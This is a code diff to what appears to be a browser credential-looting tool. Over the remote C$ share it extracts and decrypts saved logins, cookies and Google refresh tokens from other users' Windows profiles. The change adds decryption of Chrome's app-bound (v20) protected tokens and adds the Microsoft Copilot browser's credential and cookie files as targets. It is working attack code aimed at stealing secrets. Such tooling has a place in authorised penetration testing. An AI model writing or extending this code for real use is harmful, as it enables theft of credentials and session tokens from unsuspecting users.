@@ -237,8 +237,20 @@ class GoogleRefreshToken:
     def dump_quiet(self) -> None:
         print(f"[{self.browser.upper()}] GRT {self.service}:{self.token}")
 
-    def decrypt(self, aeskey) -> bool:
-        self.token = decrypt_chrome_password(self.encrypted_token, aeskey).decode("utf-8")
+    def decrypt(self,  aeskey:bytes, app_bound_key:bytes) -> bool:
+        try:
+            if self.encrypted_token[:3] == b"v20":
+                if app_bound_key is not None:
+                    self.token = decrypt_chrome_password(
+                    self.encrypted_token, app_bound_key
+                    )[32:].decode("utf-8")
+            else:
+                self.token = decrypt_chrome_password(
+                self.encrypted_token, aeskey
+                )[32:].decode("utf-8")
+        except Exception as e:
+            print(self.token)
+            logging.debug(f"Could not decrypt token: {e}")
         return self.token is not None
 
 class BrowserTriage(Triage):
@@ -278,11 +290,21 @@ class BrowserTriage(Triage):
             "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\%s\\Network\\Cookies",
         ],
     }
+    user_copilot_generic_login_path = {
+        "aesStateKeyPath": "Users\\%s\\AppData\\Local\\Microsoft\\Copilot\\User Data\\Local State",
+        "loginDataPath": "Users\\%s\\AppData\\Local\\Microsoft\\Copilot\\User Data\\%s\\Login Data",
+        "webDataPath": "Users\\%s\\AppData\\Local\\Microsoft\\Copilot\\User Data\\%s\\Web Data",
+        "cookiesDataPath": [
+            "Users\\%s\\AppData\\Local\\Microsoft\\Copilot\\User Data\\%s\\Cookies",
+            "Users\\%s\\AppData\\Local\\Microsoft\\Copilot\\User Data\\%s\\Network\\Cookies",
+        ],
+    }
     user_generic_chrome_paths = {
         "google chrome": user_google_chrome_generic_login_path,
         "msedge": user_msedge_generic_login_path,
         "brave": user_brave_generic_login_path,
         "yandex": user_yandex_generic_login_path,
+        "copilot": user_copilot_generic_login_path,
     }
 
     share = "C$"
@@ -522,7 +544,7 @@ class BrowserTriage(Triage):
                             google_refresh_token = GoogleRefreshToken(
                                 winuser=user, browser=browser, service=service, encrypted_token=encrypted_grt
                             )
-                            if google_refresh_token.decrypt(aeskey=aeskey):
+                            if google_refresh_token.decrypt(aeskey=aeskey, app_bound_key=app_bound_key):
                                 credentials.append(google_refresh_token)
                                 if self.per_loot_callback is not None:
                                     self.per_loot_callback(google_refresh_token)
